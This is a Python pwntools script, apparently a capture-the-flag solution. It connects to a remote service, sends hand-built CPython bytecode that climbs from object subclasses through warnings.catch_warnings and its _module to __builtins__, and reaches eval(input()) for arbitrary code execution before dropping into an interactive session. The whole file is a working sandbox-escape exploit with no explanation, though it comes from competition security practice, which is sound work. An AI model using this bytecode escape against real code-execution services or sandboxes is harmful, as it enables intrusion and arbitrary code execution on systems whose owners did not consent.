from pwn import *
from opcodes import *

r = remote('111.186.58.164', 13337)
r.recvuntil('success, bye!')

c = []
c += [LOAD_CONST, 6]
c += [LOAD_METHOD, 0]
c += [CALL_METHOD, 0]
c += [DUP_TOP, 0]
c += [UNPACK_SEQUENCE, 192]
c += [POP_TOP, 0] * 148
c += [STORE_NAME, 0] # __subclasses__ = operator.attrgetter
c += [POP_TOP, 0] * (184 - 148 - 2)
c += [CALL_FUNCTION, 0] # warnings.catch_warnings()
c += [DUP_TOP, 0]
c += [LOAD_METHOD, 1]
c += [CALL_METHOD, 0]

c += [BUILD_LIST, 0]
c += [UNARY_NOT, 0]
c += [UNARY_NOT, 0]
c += [UNARY_INVERT, 0]
c += [UNARY_NEGATIVE, 0]
c += [BINARY_SUBSCR, 0] # '_module'
c += [LOAD_NAME, 0]
c += [ROT_TWO, 0]
c += [CALL_FUNCTION, 1] # operator.attrgetter('_module')

c += [ROT_TWO, 0]
c += [CALL_FUNCTION, 1] # got _module

c += [DUP_TOP, 0]
c += [STORE_NAME, 1] # __dir__ = _module
c += [LOAD_METHOD, 1]
c += [CALL_METHOD, 0]
c += [UNPACK_SEQUENCE, 40]
c += [POP_TOP, 0] * 7 # '__builtins__'
c += [LOAD_NAME, 0]
c += [ROT_TWO, 0]
c += [CALL_FUNCTION, 1] # operator.attrgetter('__builtins__')
c += [LOAD_NAME, 1]
c += [CALL_FUNCTION, 1] # got __builtins__ dictionary

c += [DUP_TOP, 0]
c += [STORE_NAME, 1] # __dir__ = __builtins__ directory
c += [LOAD_METHOD, 1]
c += [CALL_METHOD, 0]
c += [UNPACK_SEQUENCE, 41]
c += [POP_TOP, 0] * 24 # 'values'
c += [LOAD_NAME, 0]
c += [ROT_TWO, 0]
c += [CALL_FUNCTION, 1] # operator.attrgetter('values')
c += [LOAD_NAME, 1]
c += [CALL_FUNCTION, 1] # got __builtins__.values
c += [CALL_FUNCTION, 0]

c += [UNPACK_SEQUENCE, 152]
c += [POP_TOP, 0] * 19
c += [STORE_NAME, 0] # __subclasses__ = eval

c += [POP_TOP, 0] * 8
c += [CALL_FUNCTION, 0] # call input()
c += [LOAD_NAME, 0]
c += [ROT_TWO, 0]
c += [CALL_FUNCTION, 1] # call eval(input())

c += [PRINT_EXPR, 0]
c += [RETURN_VALUE, 0]

r.sendlineafter('hex:', bytes(c).hex())
r.sendlineafter('gift1: ', 'subclasses')
r.sendlineafter('gift2: ', 'dir')

r.interactive()
r.close()